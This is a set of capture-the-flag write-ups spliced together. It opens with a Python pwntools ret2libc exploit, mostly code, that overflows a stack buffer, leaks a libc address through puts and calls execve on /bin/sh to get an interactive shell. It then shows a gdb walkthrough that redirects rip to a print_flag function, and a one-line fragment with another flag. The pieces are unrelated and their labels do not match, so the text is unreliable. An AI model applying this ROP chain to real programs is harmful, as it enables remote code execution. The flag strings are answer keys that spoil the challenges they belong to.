Basic Ret2Libc

Note :- I did not play this CTF, Just checked challenges after the CTF is over

```CSS  
#!/usr/bin/python

from pwn import *

context(os='linux',arch='amd64')  
context.log_level = 'DEBUG'  
context(terminal=['tmux','new-window'])

p = process('./patches')  
#p = gdb.debug('./patches','b main')  
e = ELF('./patches')  
libc = ELF('./libc-2.31.so')

JUNK = "A"*136

pop_rdi = e.search(asm('pop rdi; ret')).next()  
pop_rsi = e.search(asm('pop rsi; pop r15; ret')).next()  
gets = e.plt['gets']  
plt_puts = e.plt['puts']  
got_puts = e.got['puts']  
bss = e.get_section_by_name('.bss')["sh_addr"] + 1200  
main = e.symbols['main']

payload = JUNK + p64(pop_rdi) + p64(bss) + p64(gets) + p64(pop_rdi) +
p64(got_puts) + p64(plt_puts) + p64(pop_rsi) + p64(0) + p64(0) + p64(main)

p.recvuntil("> ")  
p.sendline(payload)  
p.sendline("/bin/sh\x00")

leak = u64(p.recvline().strip().ljust(8,'\x00'))  
libc.address = leak - libc.symbols['puts']  
print hex(libc.address)

execve = libc.symbols['execve']

payload = JUNK + p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(0) + p64(0) +
p64(execve)

p.recvuntil("> ")  
p.sendline(payload)

p.interactive()  
```# Patches

## Task

This binary does nothing.

File: patches

## Solution

This is not the intended solution. I was supposed to patch the binary. What I
did was this:

```nasm  
gdb-peda$ info functions  
All defined functions:

Non-debugging symbols:  
0x0000000000001000  _init  
0x0000000000001030  puts@plt  
0x0000000000001040  __stack_chk_fail@plt  
0x0000000000001050  _start  
0x0000000000001261  print_flag  
0x00000000000012d9  main  
0x00000000000012f0  __libc_csu_init  
0x0000000000001360  __libc_csu_fini  
0x0000000000001368  _fini  
gdb-peda$ disass main  
Dump of assembler code for function main:  
  0x00000000000012d9 <+0>:     push   rbp  
  0x00000000000012da <+1>:     mov    rbp,rsp  
  0x00000000000012dd <+4>:     lea    rdi,[rip+0xeac]        # 0x2190  
  0x00000000000012e4 <+11>:    call   0x1030 <puts@plt>  
  0x00000000000012e9 <+16>:    mov    eax,0x0  
  0x00000000000012ee <+21>:    pop    rbp  
  0x00000000000012ef <+22>:    ret  
End of assembler dump.  
```

Expecting `print_flag` to do what it's name suggests I just set a breakpoint
at the `ret` instruction and modified `rip`.

```nasm  
gdb-peda$ disass main  
Dump of assembler code for function main:  
  0x00005555555552d9 <+0>:     push   rbp  
  0x00005555555552da <+1>:     mov    rbp,rsp  
  0x00005555555552dd <+4>:     lea    rdi,[rip+0xeac]        # 0x555555556190  
  0x00005555555552e4 <+11>:    call   0x555555555030 <puts@plt>  
  0x00005555555552e9 <+16>:    mov    eax,0x0  
  0x00005555555552ee <+21>:    pop    rbp  
  0x00005555555552ef <+22>:    ret  
gdb-peda$ b *0x00005555555552ef  
Breakpoint 1 at 0x5555555552ef  
gdb-peda$ r  
Starting program: patches  
Goodbye.  
Breakpoint 1, 0x00005555555552ef in main ()  
gdb-peda$ info functions print_flag  
All functions matching regular expression "print_flag":

Non-debugging symbols:  
0x0000555555555261  print_flag  
gdb-peda$ set $rip = 0x0000555555555261  
gdb-peda$ s  
0x0000555555555262 in print_flag ()  
gdb-peda$ c  
Continuing.  
nactf{unl0ck_s3cr3t_funct10n4l1ty_w1th_b1n4ry_p4tch1ng_L9fcKhyPupGVfCMZ}  
```

Insert shrug here.  

Original writeup (https://github.com/klassiker/ctf-
writeups/blob/master/2020/newark-academy/reverse-engineering/patches.md).change some routine in IDA pro to create and print flag. very simple ;)

UMDCTF-{4ll_u_g0tt4_d0_1s_p4tch}